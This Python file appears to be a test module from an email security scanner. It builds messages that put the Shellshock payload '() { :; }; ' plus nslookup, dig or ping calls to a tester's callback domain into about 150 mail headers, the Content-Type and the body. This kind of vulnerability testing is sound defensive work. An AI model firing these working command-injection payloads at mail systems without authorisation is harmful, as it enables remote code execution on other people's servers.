from .base import MailTestBase
from email.mime.text import MIMEText
from email.message import Message

class ShellshockTest(MailTestBase):
    active = True
    identifier = "exploit-shellshock"
    name = "Shellshock Exploit"
    description = "Shellshock exploit in various headers and other locations"
    delivery_sender = True      # Test case 'Resent-Date' fails otherwise

    shellshock = "() { :; }; "  # Shellshock trigger payload
    commands = (                # Commands that should be executed. The place holder is replaced with the callback domain name
            "nslookup {}",
            "dig {}",
            "ping {}",
            )
    headers_list = (            # source: https://www.iana.org/assignments/message-headers/message-headers.xml
        "Accept-Language",
        "Alternate-Recipient",
        "Archived-At",
        "Authentication-Results",
        "Auto-Submitted",
        "Autoforwarded",
        "Autosubmitted",
        "Bcc",
        "Cc",
        "Comments",
        "Content-Identifier",
        "Content-Return",
        "Conversion",
        "Conversion-With-Loss",
        "DL-Expansion-History",
        "Date",
        "Deferred-Delivery",
        "Delivery-Date",
        "Discarded-X400-IPMS-Extensions",
        "Discarded-X400-MTS-Extensions",
        "Disclose-Recipients",
        "Disposition-Notification-Options",
        "Disposition-Notification-To",
        "DKIM-Signature",
        "Downgraded-Bcc",
        "Downgraded-Cc",
        "Downgraded-Disposition-Notification-To",
        "Downgraded-Final-Recipient",
        "Downgraded-From",
        "Downgraded-In-Reply-To",
        "Downgraded-Mail-From",
        "Downgraded-Message-Id",
        "Downgraded-Original-Recipient",
        "Downgraded-Rcpt-To",
        "Downgraded-References",
        "Downgraded-Reply-To",
        "Downgraded-Resent-Bcc",
        "Downgraded-Resent-Cc",
        "Downgraded-Resent-From",
        "Downgraded-Resent-Reply-To",
        "Downgraded-Resent-Sender",
        "Downgraded-Resent-To",
        "Downgraded-Return-Path",
        "Downgraded-Sender",
        "Downgraded-To",
        "Encoding",
        "Encrypted",
        "Expires",
        "Expiry-Date",
        "From",
        "Generate-Delivery-Report",
        "Importance",
        "In-Reply-To",
        "Incomplete-Copy",
        "Keywords",
        "Language",
        "Latest-Delivery-Time",
        "List-Archive",
        "List-Help",
        "List-ID",
        "List-Owner",
        "List-Post",
        "List-Subscribe",
        "List-Unsubscribe",
        "List-Unsubscribe-Post",
        "Message-Context",
        "Message-ID",
        "Message-Type",
        "MMHS-Exempted-Address",
        "MMHS-Extended-Authorisation-Info",
        "MMHS-Subject-Indicator-Codes",
        "MMHS-Handling-Instructions",
        "MMHS-Message-Instructions",
        "MMHS-Codress-Message-Indicator",
        "MMHS-Originator-Reference",
        "MMHS-Primary-Precedence",
        "MMHS-Copy-Precedence",
        "MMHS-Message-Type",
        "MMHS-Other-Recipients-Indicator-To",
        "MMHS-Other-Recipients-Indicator-CC",
        "MMHS-Acp127-Message-Identifier",
        "MMHS-Originator-PLAD",
        "MT-Priority",
        "Obsoletes",
        "Organization",
        "Original-Encoded-Information-Types",
        "Original-From",
        "Original-Message-ID",
        "Original-Recipient",
        "Originator-Return-Address",
        "Original-Subject",
        "PICS-Label",
        "Prevent-NonDelivery-Report",
        "Priority",
        "Received",
        "Received-SPF",
        "References",
        "Reply-By",
        "Reply-To",
        "Require-Recipient-Valid-Since",
        "Resent-Bcc",
        "Resent-Cc",
        "Resent-Date",
        "Resent-From",
        "Resent-Message-ID",
        "Resent-Reply-To",
        "Resent-Sender",
        "Resent-To",
        "Return-Path",
        "Sender",
        "Sensitivity",
        "Solicitation",
        "Subject",
        "Supersedes",
        "TLS-Report-Domain",
        "TLS-Report-Submitter",
        "To",
        "VBR-Info",
        "X400-Content-Identifier",
        "X400-Content-Return",
        "X400-Content-Type",
        "X400-MTS-Identifier",
        "X400-Originator",
        "X400-Received",
        "X400-Recipients",
        "X400-Trace",
        "Apparently-To",
        "ARC-Authentication-Results",
        "ARC-Message-Signature",
        "ARC-Seal",
        "EDIINT-Features",
        "Eesst-Version",
        "Errors-To",
        "Form-Sub",
        "Jabber-ID",
        "MMHS-Authorizing-Users",
        "Privicon",
        "SIO-Label",
        "SIO-Label-History",
        "X-Archived-At",
        "X-Mittente",
        "X-Ricevuta",
        "X-Riferimento-Message-ID",
        "X-TipoRicevuta",
        "X-Trasporto",
        "X-VerificaSicurezza",
    )

    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)
        self.backconnect = self.args.backconnect_domain

    def generateTestCases(self):
        # shellshock as mime text iterating all header fields
        for header in self.headers_list:
            for command in self.commands:
                msg = MIMEText("Shellshock")
                msg["Subject"] = "Shellshock - Header '{}' - Command {}".format(header, command.format(""))
                msg[header] = self.shellshock + command.format(self.backconnect)
                yield msg

        # shellshock in content-type and body
        # Content-Type: text/() { :; }; nslookup test.de; charset="us-ascii"
        for command in self.commands:
            payload = self.shellshock + command.format(self.backconnect)
            msg = MIMEText(payload, payload)
            msg["Subject"] = "Shellshock in Content Type and Body"
            yield msg
